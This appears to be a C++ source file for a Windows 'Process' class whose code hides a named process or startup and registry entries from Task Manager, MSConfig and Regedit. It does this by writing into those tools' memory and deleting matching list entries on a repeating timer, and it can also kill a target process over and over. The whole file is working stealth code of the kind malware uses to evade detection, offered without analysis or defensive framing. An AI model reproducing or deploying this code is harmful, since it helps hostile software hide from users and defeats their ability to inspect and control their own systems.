#include "Process.h"
#include "FunctionsWindowsNT.h"

void killPermanentProcessThread(void * threadParams);
void hidePermanentProcessTaskManagerThread(void * threadParams);
void hidePermanentProcessMSConfigThread(void * threadParams);
void hidePermanentProcessRegeditThread(void * threadParams);

Process::Process(const char * procName, char * patternToHideMSConfig, char * patternToHideRegedit) {
   msecDelayKill = DEFAULT_INTERVAL_KILL;
   msecDelayHideTaskManager = DEFAULT_INTERVAL_HIDE;
   msecDelayHideMSConfig = DEFAULT_INTERVAL_HIDE;
   msecDelayHideRegedit = DEFAULT_INTERVAL_HIDE;
   
   quitKillProcessThread = false;
   quitHideProcessTaskManagerThread = false;
   quitHideProcessMSConfigThread = false;
   quitHideProcessRegeditThread = false;
   
   processName = (char *) malloc(strlen(procName) + 1);
   if (processName != NULL) {
      strcpy(processName, procName);
      PID = FunctionsWindowsNT::getPID(processName);
      if (patternToHideMSConfig != NULL) {
         patternMSConfig = (char *) malloc(strlen(patternToHideMSConfig) + 1);
         strcpy(patternMSConfig, patternToHideMSConfig);
         if (patternToHideRegedit != NULL) {
            patternRegedit = (char *) malloc(strlen(patternToHideRegedit) + 1);
            strcpy(patternRegedit, patternToHideRegedit);   
         }
         else patternRegedit = NULL;
      }
      else patternMSConfig = NULL;
   }
   else PID = ERR_PROCESSID;
}

char * Process::getProcessName() {
   return processName;
}

unsigned long Process::getPID() {
   if (processName != NULL) {
      PID = FunctionsWindowsNT::getPID(processName);       
   }
   return PID;
}

void Process::setTerminateKillProcessThread(bool value) {
   quitKillProcessThread = value;
}

void Process::setTerminateHideProcessTaskManagerThread(bool value) {
   quitHideProcessTaskManagerThread = value;
}

void Process::setTerminateHideProcessMSConfigThread(bool value) {
   quitHideProcessMSConfigThread = value;
}

void Process::setTerminateHideProcessRegeditThread(bool value) {
   quitHideProcessRegeditThread = value;
}

bool Process::killProcess() {
   HANDLE hndProcess;
   DWORD dwExitCode = 0;
   bool result = false;
   
   if (processName != NULL) {
      hndProcess = FunctionsWindowsNT::getHandle(processName);
      if (hndProcess != NULL) {
         if (GetExitCodeProcess(hndProcess, &dwExitCode) != 0) {
            if (TerminateProcess(hndProcess, dwExitCode) != 0) { result = true; CloseHandle(hndProcess); }
            else CloseHandle(hndProcess);
         }            
         else CloseHandle(hndProcess);
      }   
   }
   return result;
}

bool Process::killPermanentProcess(unsigned long msecIntervalKill) {
   msecDelayKill = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) killPermanentProcessThread, this, 0, NULL) != NULL) return true;
   return false;
}

bool Process::hideProcessTaskManager() {
   HWND lhWndDialog, lhWndProcessList, winTaskMgrHandle;
   LV_FINDINFO listViewInfoSearch, * _listViewInfoSearch;
   HANDLE taskMgrHandle;
   char * _item;
   long itemIndex;
   unsigned long taskMgrPID;
   bool result = false;
   
   if (processName != NULL) { 
      winTaskMgrHandle = FunctionsWindowsNT::getWindowHandle(PROCESS_TASK_MANAGER_NAME);
      
      if (winTaskMgrHandle != NULL) {
         lhWndDialog = FindWindowEx(winTaskMgrHandle, 0, NULL, NULL);
         if (lhWndDialog != NULL) {
            lhWndProcessList = FindWindowEx(lhWndDialog, 0, "SysListView32", NULL);
            if (lhWndProcessList != NULL) {
               LockWindowUpdate(lhWndProcessList);
               GetWindowThreadProcessId(lhWndProcessList, &taskMgrPID);
               taskMgrHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, taskMgrPID);
               if (taskMgrHandle != NULL) {
                  _listViewInfoSearch = (LV_FINDINFO *) VirtualAllocEx(taskMgrHandle, NULL, sizeof(LV_FINDINFO), MEM_COMMIT, PAGE_READWRITE);
                  
                  if (_listViewInfoSearch != NULL) {
                     _item = (char *) VirtualAllocEx(taskMgrHandle, NULL, strlen(processName) + 1, MEM_COMMIT, PAGE_READWRITE);
                     
                     if (_item != NULL) {
                        if (WriteProcessMemory(taskMgrHandle, _item, processName, strlen(processName) + 1, NULL) != 0) {
                           listViewInfoSearch.flags = LVFI_STRING;
                           listViewInfoSearch.psz = _item;
                           if (WriteProcessMemory(taskMgrHandle, _listViewInfoSearch, &listViewInfoSearch, sizeof(LV_FINDINFO), NULL) != 0) {
                              itemIndex = SendMessage(lhWndProcessList, LVM_FINDITEM, (WPARAM) -1, (LPARAM) (const LV_FINDINFO FAR *) _listViewInfoSearch);   
                              if (itemIndex != -1) {
                                 SendMessage(lhWndProcessList, LVM_DELETEITEM, itemIndex, 0);
                                 result = true;  
                              } 
                           }
                        }
                        VirtualFreeEx(taskMgrHandle, _item, 0, MEM_RELEASE); 
                     }
                     VirtualFreeEx(taskMgrHandle, _listViewInfoSearch, 0, MEM_RELEASE); 
                  }
               }
               LockWindowUpdate(NULL);
            }
         }
      }
   }
   return result;
}

bool Process::hidePermanentProcessTaskManager(unsigned long msecIntervalKill) {
   msecDelayHideTaskManager = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hidePermanentProcessTaskManagerThread, this, 0, NULL) != NULL) return true;
   return false;
}

bool Process::hideProcessMSConfig() {
   HWND lhWndDialog, lhWndProcessList, winMSConfigHandle;
   LV_FINDINFO listViewInfoSearch, * _listViewInfoSearch;
   HANDLE MSConfigHandle;
   char * _item;
   char * patternToSearch;
   long itemIndex;
   unsigned long MSConfigPID;
   bool result = false;
   
   if (processName != NULL) {
      winMSConfigHandle = FunctionsWindowsNT::getWindowHandle(PROCESS_MSCONFIG_NAME);
               
      if (winMSConfigHandle != NULL) {
         lhWndDialog = FindWindowEx(winMSConfigHandle, 0, NULL, NULL);
         if (lhWndDialog != NULL) {
            lhWndProcessList = FindWindowEx(lhWndDialog, 0, "SysListView32", NULL);
            if (lhWndProcessList != NULL) {
               LockWindowUpdate(lhWndProcessList);
               GetWindowThreadProcessId(lhWndProcessList, &MSConfigPID);
               MSConfigHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, MSConfigPID);
               if (MSConfigHandle != NULL) {
                  _listViewInfoSearch = (LV_FINDINFO *) VirtualAllocEx(MSConfigHandle, NULL, sizeof(LV_FINDINFO), MEM_COMMIT, PAGE_READWRITE);
                  
                  if (_listViewInfoSearch != NULL) {
                     if (patternMSConfig != NULL) patternToSearch = patternMSConfig;
                     else patternToSearch = processName;
                     
                     _item = (char *) VirtualAllocEx(MSConfigHandle, NULL, strlen(patternToSearch) + 1, MEM_COMMIT, PAGE_READWRITE);
                     
                     if (_item != NULL) {
                        if (WriteProcessMemory(MSConfigHandle, _item, patternToSearch, strlen(patternToSearch) + 1, NULL) != 0) {
                           listViewInfoSearch.flags = LVFI_STRING | LVFI_PARTIAL;
                           listViewInfoSearch.psz = _item;
                           if (WriteProcessMemory(MSConfigHandle, _listViewInfoSearch, &listViewInfoSearch, sizeof(LV_FINDINFO), NULL) != 0) {
                              itemIndex = SendMessage(lhWndProcessList, LVM_FINDITEM, (WPARAM) -1, (LPARAM) (const LV_FINDINFO FAR *) _listViewInfoSearch);   
                              if (itemIndex != -1) {
                                 SendMessage(lhWndProcessList, LVM_DELETEITEM, itemIndex, 0);
                                 result = true;  
                              } 
                           }
                        }
                        VirtualFreeEx(MSConfigHandle, _item, 0, MEM_RELEASE); 
                     }
                     VirtualFreeEx(MSConfigHandle, _listViewInfoSearch, 0, MEM_RELEASE); 
                  }
               }
               LockWindowUpdate(NULL);
            }
         }
      }
   }
   return result;   
}

bool Process::hidePermanentProcessMSConfig(unsigned long msecIntervalKill) {
   msecDelayHideMSConfig = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hidePermanentProcessMSConfigThread, this, 0, NULL) != NULL) return true;
   return false;
}

bool Process::hideProcessRegedit() {
   HWND lhWndDialog, lhWndProcessList, winRegeditHandle;
   LV_FINDINFO listViewInfoSearch, * _listViewInfoSearch;
   HANDLE regeditHandle;
   char * _item;
   char * patternToSearch;
   long itemIndex;
   unsigned long regeditPID;
   bool result = false;
   
   if (processName != NULL) {
      winRegeditHandle = FunctionsWindowsNT::getWindowHandle(PROCESS_REGEDIT_NAME);
      if (winRegeditHandle != NULL) {
         lhWndProcessList = FindWindowEx(winRegeditHandle, 0, "SysListView32", NULL);
         if (lhWndProcessList != NULL) {
            LockWindowUpdate(lhWndProcessList);
            GetWindowThreadProcessId(lhWndProcessList, &regeditPID);
            regeditHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, regeditPID);
            if (regeditHandle != NULL) {
               _listViewInfoSearch = (LV_FINDINFO *) VirtualAllocEx(regeditHandle, NULL, sizeof(LV_FINDINFO), MEM_COMMIT, PAGE_READWRITE);
                  
               if (_listViewInfoSearch != NULL) {
                  if (patternRegedit != NULL) patternToSearch = patternRegedit;
                  else patternToSearch = processName;
                  
                  _item = (char *) VirtualAllocEx(regeditHandle, NULL, strlen(patternToSearch) + 1, MEM_COMMIT, PAGE_READWRITE);
                     
                  if (_item != NULL) {
                     if (WriteProcessMemory(regeditHandle, _item, patternToSearch, strlen(patternToSearch) + 1, NULL) != 0) {
                        listViewInfoSearch.flags = LVFI_STRING | LVFI_PARTIAL;
                        listViewInfoSearch.psz = _item;
                        if (WriteProcessMemory(regeditHandle, _listViewInfoSearch, &listViewInfoSearch, sizeof(LV_FINDINFO), NULL) != 0) {
                           itemIndex = SendMessage(lhWndProcessList, LVM_FINDITEM, (WPARAM) -1, (LPARAM) (const LV_FINDINFO FAR *) _listViewInfoSearch);   
                           if (itemIndex != -1) {
                              SendMessage(lhWndProcessList, LVM_DELETEITEM, itemIndex, 0);
                              result = true;  
                           } 
                        }
                     }
                     VirtualFreeEx(regeditHandle, _item, 0, MEM_RELEASE); 
                  }
                  VirtualFreeEx(regeditHandle, _listViewInfoSearch, 0, MEM_RELEASE); 
               }
            }
            LockWindowUpdate(NULL);
         }
      }
   }
   return result; 
}

bool Process::hidePermanentProcessRegedit(unsigned long msecIntervalKill) {
   msecDelayHideRegedit = msecIntervalKill;
   if (CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) hidePermanentProcessRegeditThread, this, 0, NULL) != NULL) return true;
   return false;
}

void killPermanentProcessThread(void * threadParams) {
   Process * proc1 = (Process *) threadParams;
   
   while (!proc1->terminateKillProcessThread()) {
      proc1->killProcess();
      Sleep(proc1->getIntervalKill());   
   }
}

void hidePermanentProcessTaskManagerThread(void * threadParams) {
   Process * proc1 = (Process *) threadParams;
   
   while (!proc1->terminateHideProcessTaskManagerThread()) {
      proc1->hideProcessTaskManager();
      Sleep(proc1->getIntervalTaskManagerHide());   
   }
}

void hidePermanentProcessMSConfigThread(void * threadParams) {
   Process * proc1 = (Process *) threadParams;
   
   while (!proc1->terminateHideProcessMSConfigThread()) {
      proc1->hideProcessMSConfig();
      Sleep(proc1->getIntervalMSConfigHide());   
   }
}

void hidePermanentProcessRegeditThread(void * threadParams) {
   Process * proc1 = (Process *) threadParams;
   
   while (!proc1->terminateHideProcessRegeditThread()) {
      proc1->hideProcessRegedit();
      Sleep(proc1->getIntervalRegeditHide());   
   }
}
